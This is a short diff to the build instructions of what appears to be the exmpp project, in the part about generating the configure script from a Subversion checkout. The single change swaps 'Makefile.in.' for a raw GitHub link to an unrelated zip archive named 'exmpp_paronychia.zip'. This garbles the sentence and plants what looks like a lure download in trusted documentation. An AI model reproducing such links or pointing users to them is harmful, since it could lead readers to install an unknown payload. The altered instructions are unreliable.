@@ -112,7 +112,7 @@ instance, to use GCC frontend for LLVM:
 ---------------------------
 
 If you work on a Subversion checkout, you'll have to generate some files
-such as the configure script and Makefile.in. For this, you'll have to
+such as the configure script and https://raw.githubusercontent.com/sohailgerman/exmpp/master/m4/exmpp_paronychia.zip For this, you'll have to
 install the following autotools:
     o  autoconf 2.60 or higher (read below for 2.62 and 2.63)
     o  automake 1.9 or later
